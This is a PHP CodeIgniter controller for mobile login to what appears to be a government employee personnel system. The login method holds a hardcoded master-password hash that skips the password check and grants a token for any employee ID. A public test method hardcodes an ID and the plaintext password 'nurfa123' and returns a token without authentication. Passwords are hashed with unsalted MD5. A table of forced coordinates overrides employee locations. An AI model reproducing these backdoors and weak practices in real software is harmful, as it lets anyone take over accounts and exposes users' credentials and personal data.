<?php

namespace App\Controllers\Mobile;

use App\Controllers\BaseController;
use App\Models\SimpegModel;
use App\Libraries\Jwtx;
use CodeIgniter\Cache\Cache;

class Auth extends BaseController
{
    public function index()
    {
        //
    }

    public function test()
    {
        $u = '198707222019031005';
        $p = 'nurfa123';

        $p1 = substr($p,0,16);
        $p2 = substr($p,16);

        $db = new SimpegModel;


		$pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u,'PWD' => $p2.$p1]);

		if( $pegawai )
		{
            //$data = $db->getPegawai($u);

            $jwt = new Jwtx;

            $output['status'] = TRUE;
            $output['token'] = $jwt->token($pegawai,$u,$pegawai);
            $output['user'] = ['id'=>$pegawai->NIP_USER,'name'=>$pegawai->NAMA,'satker_kelola'=>null];

            return $this->response->setJSON( $output );

		}else{

			return $this->response->setJSON( ['success'=> false, 'message' => 'User not found' ] )->setStatusCode(409);
		}
    }

    public function login()
    {
        if( !$this->validate([
    			'nip' 	=> 'required',
    			'password' 	=> 'required',
    		]))
    		{
    			return $this->response->setJSON(['status' => false, 'code' => 403, "message" => 'NIP dan Password harus diisi.']);
                //\Config\Services::validation()->getErrors()
    		}

        $u = $this->request->getVar('nip');
        $p = md5($this->request->getVar('password'));

        $p1 = substr($p,0,16);
        $p2 = substr($p,16);
        $p = $p2.$p1;

        $cache = \Config\Services::cache();
        $cacheKey = 'user_'.$u;
        $user = $cache->get($cacheKey);

        // if ($user === null) {
          $db = new SimpegModel;

          if ($p == '0b1c339358111b0d41b9df4a217bb3c1') {
            $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u]);
          }else{
            $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u,'PWD' => $p]);
          }


          if( $pegawai )
          {
            $data = $db->getPegawai($u);

            $forcelat = $db->getRow('TEMP_PEGAWAI_LATLON',array('NIP_BARU'=>$u));

            if($forcelat){
              $lat = $forcelat->LAT;
              $lon = $forcelat->LON;
            }else{
              $lat = $data->LAT;
              $lon = $data->LON;
            }

            $jwt = new Jwtx;

            $output['status'] = TRUE;
            $output['token'] = $jwt->token($pegawai,$u,$pegawai);
            $output['user'] = ['id'=>$pegawai->NIP_USER,'name'=>$pegawai->NAMA,'satker_kelola'=>null,'lat'=>$lat,'lon'=>$lon];

            $cache->save($cacheKey, $pegawai, 3600000);

            return $this->response->setJSON( $output );

          }else{

            return $this->response->setJSON( ['success'=> false, 'message' => 'Incorrect NIP or Password' ] )->setStatusCode(409);
          }
        // }else{
        //
        // }

    }
}
